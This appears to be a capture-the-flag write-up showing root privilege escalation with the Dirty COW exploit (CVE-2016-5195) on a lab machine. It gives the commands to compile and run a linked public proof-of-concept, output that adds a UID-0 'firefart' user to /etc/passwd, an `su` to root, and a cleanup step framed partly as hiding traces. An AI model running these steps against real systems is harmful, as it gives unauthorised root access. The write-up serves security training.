# Privilege Escalation via Dirty COW (CVE-2016-5195)

One effective method to escalate privileges to root on vulnerable Linux systems is by exploiting the well-known **Dirty COW** vulnerability — officially identified as [CVE-2016-5195](https://dirtycow.ninja/).

This vulnerability allows a local user to gain write access to read-only memory mappings, making it possible to modify files the user normally shouldn’t be able to — such as `/etc/passwd`.

In this case, we use a public proof-of-concept written in C, available here:
➡️ [https://github.com/firefart/dirtycow/blob/master/dirty.c](https://github.com/firefart/dirtycow/blob/master/dirty.c)

---

### Exploitation Steps

```bash
laurie@BornToSecHackMe:~$ cd /tmp
laurie@BornToSecHackMe:/tmp$ cat > dirty.c << EOF
[...] // C exploit code
EOF
laurie@BornToSecHackMe:/tmp$ gcc dirty.c -o dirty -pthread -lcrypt
laurie@BornToSecHackMe:/tmp$ ./dirty
```

The exploit will:

* Backup `/etc/passwd` to `/tmp/passwd.bak`
* Prompt for a new password
* Inject a new root-level user into `/etc/passwd`

Example output:

```
/etc/passwd successfully backed up to /tmp/passwd.bak  
Please enter the new password:  
Complete line:  
firefart:fi86Ixhn/lTi2:0:0:pwned:/root:/bin/bash  

Done! Check /etc/passwd to see if the new user was created.  
You can log in with the username 'firefart' and the password 'q'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

---

### Gaining Root Access

Now that the new user has been created with UID 0 (root), we can switch to it using `su`:

```bash
laurie@BornToSecHackMe:/tmp$ su firefart
Password:
firefart@BornToSecHackMe:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
```

✅ We have successfully gained **root privileges**.

---

### Important: Cleanup

After exploitation, it is crucial to **restore the original `/etc/passwd` file** to avoid breaking the system or leaving obvious traces:

```bash
mv /tmp/passwd.bak /etc/passwd
```